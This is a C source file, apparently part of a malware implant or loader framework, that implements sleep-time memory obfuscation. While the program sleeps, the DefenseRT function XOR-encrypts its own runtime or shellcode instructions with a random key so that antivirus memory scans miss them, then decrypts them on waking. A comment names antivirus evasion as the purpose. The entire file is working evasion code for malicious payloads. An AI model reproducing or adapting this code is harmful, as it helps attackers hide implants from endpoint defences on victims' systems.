#include "c_types.h"
#include "lib_memory.h"
#include "random.h"
#include "shield.h"

// Only the instructions related to the DefenseRT function are
// in plain text during Sleep, so if you need to advance AV, 
// you only need to customize this function.

#define XOR_KEY_SIZE 256

void xorInstructions(Shield_Ctx* ctx, byte* key);

__declspec(noinline)
bool DefenseRT(Shield_Ctx* ctx)
{
    // use "mem_clean" for prevent incorrect compiler
    // optimize and generate incorrect shellcode
    byte key[XOR_KEY_SIZE];
    mem_clean(&key, sizeof(key));
    // generate random key
    RandBuf(&key[0], XOR_KEY_SIZE);
    // hide runtime(or with shellcode) instructions
    xorInstructions(ctx, &key[0]);
    // simulate kernel32.Sleep()
    bool success = ctx->WaitForSingleObject(ctx->hProcess, ctx->SleepTime);
    // recover runtime(or with shellcode) instructions
    xorInstructions(ctx, &key[0]);
    return success;
}

void xorInstructions(Shield_Ctx* ctx, byte* key)
{
    // calculate shellcode position
    uintptr beginAddr = ctx->BeginAddress;
    uintptr endAddr   = (uintptr)(&DefenseRT);
    // hide runtime(or with shellcode) instructions
    byte keyIdx = 0;
    for (uintptr addr = beginAddr; addr < endAddr; addr++)
    {
        byte* data = (byte*)addr;
        byte k = key[keyIdx];
        *data ^= k;
        // select key
        keyIdx = k+1;
    }
}
